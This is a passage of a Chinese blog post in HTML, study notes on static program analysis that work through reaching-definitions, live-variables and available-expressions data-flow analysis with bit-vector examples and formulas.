style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ki</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>而gen<sub>b</sub>不难得出，D3中的m被到达，此时由0变1；而D4中的y，由于前驱节点B1中，存在D2重复定义y，需要被kill掉D2，故将第二位置0。所以最后的<code>OUT[B2]</code>为<code>1011 0000</code>。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230327164846183.png" alt="image-20230327164846183"></p><p>同样的，B3的前驱节点只有B2。其并集也就是<code>B2[OUT] = 1011 0000 = B3[IN]</code>。因为D7里的定义x，在D1存在重复定义，故将D1的位向量置0。根据公式，因为现在运行的D7存在重复定义的x，表示可以被到达，所以D7位会置1。故<code>OUT[B3] = 0011 0010 </code>。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230327165420782.png" alt="image-20230327165420782"></p><p>接下来顺序执行到B4，根据公式得到<code>IN[B4] = 1011 0000</code>，<code>OUT[B4] = 0011 1100  </code></p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230327165950979.png" alt="image-20230327165950979"></p><p>最后执行B5，根据公式计算：<code>IN[B5] = 0011 1110</code>，<code>OUT[B5] = 0011 1011</code></p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230327170153272.png" alt="image-20230327170153272"></p><p>此时第一次遍历结束了，要不要进行第二次遍历，取决于每个BB的<strong>输出状态</strong>是否改变。在这里所有BB的状态都发生了改变，所以要进行第二次迭代。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">B1</span>[IN] = <span class="hljs-number">0000</span> <span class="hljs-number">0000</span><br><span class="hljs-attribute">B1</span>[OUT] = <span class="hljs-number">1100</span> <span class="hljs-number">0000</span><br><br><span class="hljs-attribute">B2</span>[IN] = B1[OUT_1] <span class="hljs-number">1100</span> <span class="hljs-number">0000</span> ∪ B4[OUT_1] <span class="hljs-number">0011</span> <span class="hljs-number">1100</span> = <span class="hljs-number">1111</span> <span class="hljs-number">1100</span><br><span class="hljs-attribute">B2</span>[OUT] = <span class="hljs-number">1011</span> <span class="hljs-number">1100</span><br><br><span class="hljs-attribute">B3</span>[IN] = <span class="hljs-number">1011</span> <span class="hljs-number">1100</span><br><span class="hljs-attribute">B3</span>[OUT] = <span class="hljs-number">0011</span> <span class="hljs-number">0110</span><br><br><span class="hljs-attribute">B4</span>[IN] = <span class="hljs-number">1011</span> <span class="hljs-number">1100</span><br><span class="hljs-attribute">B4</span>[OUT] = <span class="hljs-number">0011</span> <span class="hljs-number">1100</span><br><br><span class="hljs-attribute">B5</span>[IN] = B4[OUT] <span class="hljs-number">0011</span> <span class="hljs-number">1100</span> ∪ B3[OUT] <span class="hljs-number">0011</span> <span class="hljs-number">0110</span> = <span class="hljs-number">0011</span> <span class="hljs-number">1110</span><br><span class="hljs-attribute">B5</span>[OUT] = <span class="hljs-number">0011</span> <span class="hljs-number">1010</span><br></code></pre></td></tr></table></figure><p>第二次迭代结束，因为发生了状态（B2、B3）的改变，依然需要第三次遍历。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">B1[IN]</span> <span class="hljs-string">=</span> <span class="hljs-number">0000 </span><span class="hljs-number">0000</span><br><span class="hljs-string">B1[OUT]</span> <span class="hljs-string">=</span> <span class="hljs-number">1100 </span><span class="hljs-number">0000</span><br><br><span class="hljs-string">B2[IN]</span> <span class="hljs-string">=</span> <span class="hljs-string">B1[OUT_2]</span> <span class="hljs-number">1100 </span><span class="hljs-number">0000</span> <span class="hljs-string">∪</span> <span class="hljs-string">B4[OUT_2]</span> <span class="hljs-number">0011 </span><span class="hljs-number">1100</span> <span class="hljs-string">=</span> <span class="hljs-number">1111 </span><span class="hljs-number">1100</span><br><span class="hljs-string">B2[OUT]</span> <span class="hljs-string">=</span> <span class="hljs-number">1011 </span><span class="hljs-number">1100</span><br><br><span class="hljs-string">//此时输入和第二次遍历是一样的，所以此时输出也是一样的</span><br><span class="hljs-string">B3[IN]</span> <span class="hljs-string">=</span> <span class="hljs-number">1011 </span><span class="hljs-number">1100</span><br><span class="hljs-string">B3[OUT]</span> <span class="hljs-string">=</span> <span class="hljs-number">0011 </span><span class="hljs-number">0110</span><br><br><span class="hljs-string">B4[IN]</span> <span class="hljs-string">=</span> <span class="hljs-number">1011 </span><span class="hljs-number">1100</span><br><span class="hljs-string">B4[OUT]</span> <span class="hljs-string">=</span> <span class="hljs-number">0011 </span><span class="hljs-number">1100</span><br><br><span class="hljs-string">B5[IN]</span> <span class="hljs-string">=</span> <span class="hljs-string">B4[OUT]</span> <span class="hljs-number">0011 </span><span class="hljs-number">1100</span> <span class="hljs-string">∪</span> <span class="hljs-string">B3[OUT]</span> <span class="hljs-number">0011 </span><span class="hljs-number">0110</span> <span class="hljs-string">=</span> <span class="hljs-number">0011 </span><span class="hljs-number">1110</span><br><span class="hljs-string">B5[OUT]</span> <span class="hljs-string">=</span> <span class="hljs-number">0011 </span><span class="hljs-number">1010</span><br></code></pre></td></tr></table></figure><p>此时已经不需要第四次遍历了，因为没有发生输出状态的改变。</p><p>通过这个例子可以发现，这个迭代最终是会停止的：</p><p>因为gen<sub>s</sub>和kill<sub>s</sub>在每次的迭代中都是保持不变的，在每次迭代的时候，会有一些新的facts加入到IN[S]，这些facts要么被kill掉，要么存活。一旦新的facts被加入到OUT[S]中，不管是加入到gen<sub>s</sub>还是存活下来，它都会一直存在。并且OUT[S]不会发生从1-&gt;0的改变（只有0-&gt;1，或者1-&gt;1）。OUT[s]不会缩小，它只会变大。</p><blockquote><p>一些个人的想法（不一定对）：这个算法的输出状态是以代码基本块的语句为单位的，每当块内语句出现一次新的定义变量，那么在位向量中，相应的位置就会置1；如果存在之前重复的定义变量，则将之前重复定义的语句对应的向量位置0，新定义的语句对应的向量位置1，表示该变量只有新语句有效。最后迭代完成后，每个代码块所达到的状态，就是位向量对应语句，在运行到该代码块时的有效状态。</p><p>以<code>B2[OUT]</code>为例，此时<code>B2[OUT]</code>代表的就是运行完B2之后，整个程序代码语句的有效状态。因为<code>B2[OUT]</code>为<code>1011 1100</code>，所以对于刚运行完B2这个时刻而言，语句D1、D3、D4、D5、D6都是有效代码：D1是对x的定义，截至到B2运行结束都是有效的；D3和D4都是B2的代码，刚刚运行完，自然也是有效代码；B4中的D5、D6对于B2而言，如果B4处于B2的前驱，此时D5、D6的重定义会影响到B2，表示D5、D6的重定义可以到达。而B3也重定义了x，但它不属于B2的前驱，不会影响B2。</p></blockquote><h3 id="Live-Variables-Analysis">Live Variables Analysis</h3><h4 id="Overview-of-Live-Variables-Analysis">Overview of Live Variables Analysis</h4><p>Live variables analysis tells whether the value of variable v at program point p could be used along some path in CFG starting at p. If so, v is live at p; otherwise, v is dead at p.</p><p>首先存在一条路径，从p到结束，而且我们想知道变量v是否在p处存活，且v不应该被在被使用之前重定义。</p><ul><li>Information of live variables can be used for register allocations. e.g., at some point all registers are full and we need to use one, then we should favor using a register with a dead value.<ul><li>假设某刻存在所有寄存器都被写满（这一时刻也是program point），通过live variables分析我们可以知道哪个是dead value，从而替换掉dead value在寄存器里的值。如果使用掉其他正常的寄存器，可能会出现死机等情况。</li></ul></li></ul><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328102345563.png" alt="image-20230328102345563"></p><h4 id="Understanding-Live-Variables-Analysis">Understanding Live Variables Analysis</h4><ul><li><p>Data Flow Values/Facts</p><ul><li><p>All the variables in a program</p><ul><li>在这个存活变量分析中，我们主要关注的就是程序中所有的变量</li></ul></li><li><p>Can be represented by bit vectors</p><ul><li>这些facts可以用位向量表示</li></ul></li></ul></li></ul><p>那么Live Variables Analysis应使用正向分析还是逆向分析，使得算法更加直观呢？实际上，在我们分析的过程中，没有必须用正向或逆向分析的说法；但是为了设计算法方便和直观，我们通常情况下使用backward analysis。</p><p>假如我们使用了Forward analysis，程序从顶向下分析，直到使用了变量v，才会给位向量置1. 但是，如果变量v到最后才会被使用，那么此时需要给已经分析过的代码状态全部置1（因为这里位向量表示的是所有变量全局的状态），就会和前面已经分析过的部分再次关联起来。而逆向分析从底向上，只要遇到哪个变量被使用就置1即可，此后在分析的过程中，就默认将位向量对应位置1了。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328111526197.png" alt="image-20230328111526197"></p><p>上图给出了一个简单的逆向分析例子。通过这个例子，我们可以列出公式，得到某个BB的存活变量状态。</p><blockquote><p>勘误：上图中OUT[B]公式，等号右边IN[B]应该为IN[S]</p></blockquote><p>首先是OUT[B]：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>O</mi><mi>U</mi><mi>T</mi><mo stretchy="false">[</mo><mi>B</mi><mo stretchy="false">]</mo><mo>=</mo><msub><mo>∪</mo><mrow><mi>S</mi><mtext> </mtext><mi>a</mi><mtext> </mtext><mi>s</mi><mi>u</mi><mi>c</mi><mi>c</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>o</mi><mi>r</mi><mtext> </mtext><mi>o</mi><mi>f</mi><mtext> </mtext><mi>B</mi></mrow></msub><mtext> </mtext><mi>I</mi><mi>N</mi><mo stretchy="false">[</mo><mi>S</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">OUT[B] = ∪_{S\ a \ successor \ of \ B} \ IN[S]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mbin">∪</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span><span class="mspace mtight"><span class="mtight"> </span></span><span class="mord mathnormal mtight">a</span><span class="mspace mtight"><span class="mtight"> </span></span><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">ccessor</span><span class="mspace mtight"><span class="mtight"> </span></span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mspace mtight"><span class="mtight"> </span></span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">]</span></span></span></span></span></p><p>这里B的输出等于所有B的后继节点输入的并集。因为只要B之后有任意一条路径，存在某一个变量v被使用，那么v在B的输出状态中依然时被使用的。</p><p>如果B中存在不同的代码语句，得到IN[B]的结果也不相同：</p><ol><li>k = n<ol><li>因为是从底向上分析，OUT[B]已知为v，而此时v没有被重定义（如果发生重定义，那么v就是一个dead code），且k没有用到，故存活变量状态就只有v</li></ol></li><li>k = v<ol><li>同上分析，v只是被使用，没有被重定义，所以还是v</li></ol></li><li>v = 2<ol><li>此时发生了重定义，所以v应该被删除</li></ol></li><li>v = v - 1<ol><li>这里是先将v使用（v - 1），然后在定义（v = v - 1），虽然v被重定义了，但是在重定义之前被使用了。在<code>v-1</code>这一刻，还是P里<code>v=3</code>的值，变量还是存活的</li></ol></li><li>v = 2; k = v<ol><li>这里讨论的是运行到B时，B之前的（也就是B的上半部分）变量存活情况，第一个语句是<code>v = 2</code>，表示变量v被重定义，也就是没用到p中定义的变量v，所以应该被舍弃。即使下条语句<code>k = v</code>用到了v，也不能置1。因为<strong>这个状态是表示该基本代码块之前的变量存活状态。</strong></li><li>即使P里没有定义v，依然也需要将v的状态舍弃。我个人的理解是，因为在实际从底向上分析的时候，我们并不清楚程序上面的路径是否存在变量v的定义，所以这里依然需要置0。同样的，我觉得这种做法是为了符合<strong>sound</strong>和<strong>safe-approximation</strong>的原则。</li></ol></li><li>k = v; v =  2；<ol><li>与第四个情况相同，因为<strong>在运行到B的时候，v先被使用了</strong>，才被重定义，此时B中v的状态还是存活的</li><li>根据第四和第六的情况，我们可以简单理解成， 只要先赋值（使用）再定义，依然视为变量存活</li></ol></li></ol><p>根据上面的场景，我们可以得到IN[B]的公式：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mi>N</mi><mo stretchy="false">[</mo><mi>B</mi><mo stretchy="false">]</mo><mo>=</mo><mi>u</mi><mi>s</mi><msub><mi>e</mi><mi>B</mi></msub><mo>∪</mo><mo stretchy="false">(</mo><mi>O</mi><mi>U</mi><mi>T</mi><mo stretchy="false">[</mo><mi>B</mi><mo stretchy="false">]</mo><mo>−</mo><mi>d</mi><mi>e</mi><msub><mi>f</mi><mi>B</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">IN[B] = use_B ∪ (OUT[B] - def_B)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7056em;vertical-align:-0.15em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>这里的def<sub>B</sub>自然指代的是B中重定义的变量（场景3、4、5、6），而重定义的变量需要从已使用的变量中剔除（也就是OUT[B]），最后和基本块中使用的变量取并集，就可以得到B最后的存活变量状态。</p><h4 id="Algorithm-of-Live-Variables-Analysis（存活变量算法）">Algorithm of Live Variables Analysis（存活变量算法）</h4><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328133424830.png" alt="image-20230328133424830"></p><p>因为存活变量检测，是用backward analysis来实现，是给定OUT状态求解IN状态，故初始化的时候，应该对IN状态进行初始化。</p><blockquote><p>注：一般情况下，<strong>may analysis</strong>的初始化是<strong>空集</strong>，而<strong>must analysis</strong>的初始化是<strong>ALL</strong>.</p></blockquote><p>这个算法和之前的Reaching Definitions是很相似的，只是初始值和BB状态改变时的算法不同，其余运作原理都是一样的，这里不作赘述。</p><p>依旧来看一道和定义到达相似的例题：</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328135825346.png" alt="image-20230328135825346"></p><p>在这个例题中，我们将每一个变量的状态，组成一个位向量。根据算法，对所有BB的存活变量状态进行初始化，这里都是<code>000 0000</code>。按照自底向上的顺序，首先开始B5的运算。</p><p>由于B5没有后继节点，所以其输出态<code>OUT[B5]=000 0000</code>。在B5中，存在一个使用的变量p，故p位置1。所以B5的输入态<code>IN[B5]=000 1000</code>。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328140439016.png" alt="image-20230328140439016"></p><p>继续求B3，已知B3的输出态等于B5的输入态，故<code>OUT[B3] = IN[B5] = 000 1000</code>。跟据之前的情景实例，B3此处使用了x变量，之后再进行的重定义，所以x位依然置1，此时B3的输入态为<code>IN[B3] = 100 1000</code>。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328141022865.png" alt="image-20230328141022865"></p><p>同理，B4的输出态就是其后继节点的输入态。这里<strong>B4存在两个后继节点</strong>：B5和B2。因为B2的初始输入态就是<code>000 0000</code>，之后并上B5的输入态仍然是<code>IN[B5]</code>本身，故<code>OUT[B4] = IN[B5] = OUT[B3] = 000 1000</code>。在B4中，首先对x进行了重定义，之后使用了y，定义了q。所以此处需要将y对应的标记为置1，得到<code>IN[B4] = 010 1000</code>。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328141621088.png" alt="image-20230328141621088"></p><p>下一步来到B2，首先将B2的后继节点B4和B3进行union：<code>IN[B4] ∪ IN[B3] = 010 1000 | 100 1000 = 110 1000 = OUT[B2]</code>。分析B2中，变量k被使用，变量m先被重定义，之后又进行赋值使用，变量y被重定义，故k位置1、m位置0。因为y被重定义，所以这里应该删去y变量，最后的输出态应该为：<code>IN[B2] = 100 1001</code>。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328143141674.png" alt="image-20230328143141674"></p><p>最后计算B1，根据公式，B1的输出太等于其后继节点B2的输入态：<code>OUT[B1] = IN[B2] = 100 1001</code>，且在B1种，变量p、q和z均被使用，而x和y也均发生重定义，所以p和q位置1，x和y位置0，得到B1的输入态<code>IN[B1] = 001 1101</code>。第一次遍历结束。</p><p>与定义到达算法相同，存活变量检测也需要进行迭代，直到所有的输入态满足约束条件，迭代才会停止。这里所有的基本快的输入态都变化了，所以需要有第二次遍历。同样的，定义到达是输入决定输出，<strong>一旦输入稳定，输出就不会变</strong>；这里也是如此，<strong>只要输出态不变，输入态就不会改变</strong>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">B5</span>[OUT] = <span class="hljs-number">000</span> <span class="hljs-number">0000</span><br><span class="hljs-attribute">B5</span>[IN] = <span class="hljs-number">000</span> <span class="hljs-number">1000</span><br><br><span class="hljs-attribute">B4</span>[OUT] = B5[IN] | B2[IN_1] = <span class="hljs-number">000</span> <span class="hljs-number">1000</span> | <span class="hljs-number">100</span> <span class="hljs-number">1001</span> = <span class="hljs-number">100</span> <span class="hljs-number">1001</span><br><span class="hljs-attribute">B4</span>[IN] = <span class="hljs-number">010</span> <span class="hljs-number">1001</span><br><br><span class="hljs-attribute">B3</span>[OUT] = B5[IN] = <span class="hljs-number">000</span> <span class="hljs-number">1000</span><br><span class="hljs-attribute">B3</span>[IN] = B3[IN_1] = <span class="hljs-number">100</span> <span class="hljs-number">1000</span><br><br><span class="hljs-attribute">B2</span>[OUT] = B4[IN] | B3[IN] = <span class="hljs-number">010</span> <span class="hljs-number">1001</span> | <span class="hljs-number">100</span> <span class="hljs-number">1000</span> = <span class="hljs-number">110</span> <span class="hljs-number">1001</span><br><span class="hljs-attribute">B2</span>[IN] = <span class="hljs-number">100</span> <span class="hljs-number">1001</span><br><br><span class="hljs-attribute">B1</span>[OUT] = B2[IN] = <span class="hljs-number">100</span> <span class="hljs-number">1001</span><br><span class="hljs-attribute">B1</span>[IN] = B1[IN_1] = <span class="hljs-number">001</span> <span class="hljs-number">1001</span><br></code></pre></td></tr></table></figure><p>此时B4的输入态发生改变，进行第三次迭代：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs inform7">B5<span class="hljs-comment">[OUT]</span> = 000 0000<br>B5<span class="hljs-comment">[IN]</span> = 000 1000<br><br>//此时发现全部都没有变了<br>B4<span class="hljs-comment">[OUT]</span> = B5<span class="hljs-comment">[IN]</span> | B2<span class="hljs-comment">[IN_2]</span> = 000 1000 | 100 1001 = 100 1001<br>B4<span class="hljs-comment">[IN]</span> = 010 1001<br><br>B3<span class="hljs-comment">[OUT]</span> = B5<span class="hljs-comment">[IN]</span> = 000 1000<br>B3<span class="hljs-comment">[IN]</span> = B3<span class="hljs-comment">[IN_1]</span> = 100 1000<br><br>B2<span class="hljs-comment">[OUT]</span> = B4<span class="hljs-comment">[IN]</span> | B3<span class="hljs-comment">[IN]</span> = 010 1001 | 100 1000 = 110 1001<br>B2<span class="hljs-comment">[IN]</span> = 100 1001<br><br>B1<span class="hljs-comment">[OUT]</span> = B2<span class="hljs-comment">[IN]</span> = 100 1001<br>B1<span class="hljs-comment">[IN]</span> = B1<span class="hljs-comment">[IN_1]</span> = 001 1001<br></code></pre></td></tr></table></figure><p>发现所有的BB状态稳定了，迭代完成。</p><h3 id="Available-Expressions-Analysis">Available Expressions Analysis</h3><h4 id="Overview-of-Available-Expressions-Analysis">Overview of Available Expressions Analysis</h4><p>An expression <strong>x op y</strong> is available at program point p if (1) all paths from the entry to p must pass through the evaluation of x op y, and (2) after the last evaluation of x op y, there is no redefinition of x or y.</p><p>如果或一个表达式在P点时可用的，那么也就意味着从入口到P点的所有路径，都必须执行<code>x op y</code>，并且在执行完这个语句后，没有发生x和y的重定义。</p><ul><li>The definition means at program p, we can replace expression x op y by the result of its last evaluation</li><li>The information of available expressions can be used for detecting global common subexpressions.</li></ul><h4 id="Understanding-Available-Expressions-Analysis">Understanding Available Expressions Analysis</h4><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328161300227.png" alt="image-20230328161300227"></p><p>Available Expressions Analysis的数据流如下图所示，显然是一个正向分析。在执行语句之前，输入态存在<code>a + b</code>。而语句本身是<code>a = x op y</code>，那么我们需要将这个表达式以gen的形式加入到OUT里；并且要删除掉有关于a的定义：</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328161845466.png" alt="image-20230328161845466"></p><p>在下面的示例中，a表达式走左侧路径，执行x重定义，根据规则，删除掉与x有关的表达式，在此时变为空集，并接着执行b表达式，仍然是<code>e^16 * x</code>和刚开始的<code>a = e^16 * x</code>是相同的，所以此时又把<code>e^16 * x</code>加入到集合中；在右侧路径，就直接到了最后，集合里的表达式没变，两者取交集（因为是所有路径都要满足，所以也是must analysis），得到这个表达式是存活的（也就是available）。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230328163036162.png" alt="image-20230328163036162"></p><p>根据上面的步骤，可以得到IN[B]：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mi>N</mi><mo stretchy="false">[</mo><mi>B</mi><mo stretchy="false">]</mo><mo>=</mo><msub><mo>∩</mo><mrow><mi>P</mi><mtext> </mtext><mi>a</mi><mtext> </mtext><mi>p</mi><mi>r</mi><mi>e</mi><mi>d</mi><mi>e</mi><mi>c</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>o</mi><mi>r</mi><mtext> </mtext><mi>o</mi><mi>f</mi><mtext> </mtext><mi>B</mi></mrow></msub><mtext> </mtext><mi>O</mi><mi>U</mi><mi>T</mi><mo stretchy="false">[</mo><mi>P</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">IN[B] = ∩_{P\ a \ predecessor \ of \ B} \ OUT[P]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mbin">∩</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mspace mtight"><span class="mtight"> </span></span><span class="mord mathnormal mtight">a</span><span class="mspace mtight"><span class="mtight"> </span></span><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">ecessor</span><span class="mspace mtight"><span class="mtight"> </span></span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mspace mtight"><span class="mtight"> </span></span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span 